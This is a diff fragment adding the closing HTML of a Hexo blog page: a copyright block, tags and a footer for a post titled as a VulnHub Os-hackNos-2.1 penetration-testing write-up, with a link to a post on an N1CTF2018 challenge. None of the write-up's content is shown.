+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/07/10/VulnHub_Os-hackNos-2.1/">https://bantttian.github.io/2020/07/10/VulnHub_Os-hackNos-2.1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/07/08/%5BN1CTF2018%5Deating_cms/">N1CTF2018_eating_cms</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
